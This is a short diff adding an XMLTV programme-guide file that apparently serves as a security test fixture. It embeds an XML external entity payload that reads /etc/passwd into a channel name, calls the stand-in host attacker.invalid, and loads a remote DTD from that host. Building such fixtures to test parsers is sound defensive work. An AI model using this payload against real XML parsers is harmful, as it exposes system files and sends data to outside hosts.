@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE tv [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY remote SYSTEM "http://attacker.invalid/exfiltrate">
+  <!ENTITY % param SYSTEM "http://attacker.invalid/evil.dtd">
+  %param;
+]>
+<tv>
+  <channel id="xxe.example"><display-name>&xxe;</display-name></channel>
+  <programme start="20260914060000 +0000" stop="20260914070000 +0000" channel="xxe.example">
+    <title>Safe Title</title>
+    <desc>&remote;</desc>
+  </programme>
+</tv>
